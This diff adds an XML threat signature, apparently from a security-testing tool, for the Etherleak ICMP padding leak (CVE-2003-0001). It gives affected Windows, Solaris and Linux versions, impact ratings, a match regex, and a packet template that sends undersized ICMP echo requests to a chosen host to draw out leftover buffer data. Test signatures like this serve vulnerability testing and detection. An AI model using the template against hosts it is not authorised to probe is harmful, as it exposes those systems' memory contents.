@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Linux Buffer Exposure"/>
+    <EngDesc display="true" value="This exploit exposes an issue in the ICMP request protocol which occurs when sending ICMP requests that are smaller than the minimum frame size to a user specified host. Ethernet packets must be 64 bytes in length and will be padded with zeros to ensure this. When the packet is smaller than the minimum size this will result in the packet being padded with information off of the host's buffer which may contain sensitive information. This information can be, but is not limited to, user passwords and login information, and recent user activities."/>
+    <Intent display="true">
+      <item value="Scoping"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+      <item value="Linux"/>
+      <item value="Sun"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+      <item value="Linux_Linux"/>
+      <item value="Sun_Solaris"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000_SP1"/>
+      <item value="Microsoft_Windows_XP"/>
+      <item value="Sun_Solaris_2.6"/>
+      <item value="Linux_Linux_Kernel_2.2.10"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/6535"/>
+    <CVEID display="true" value="CVE-2003-0001"/>
+    <bugtraqID display="true" value="6535"/>
+    <OSVDB display="true" value="3873"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464ea7ff00a900fe009b00c95fe24f28"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726699468437500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="IP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X08\X00\X1f\X14\Xd8\Xeb\X00\X00\X01"/>
+    <Created value="1139462172" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="" FragmentOffset="" TTL="40" Protocol="1" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="08001f14d8eb000001" CE="false" DF="true" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
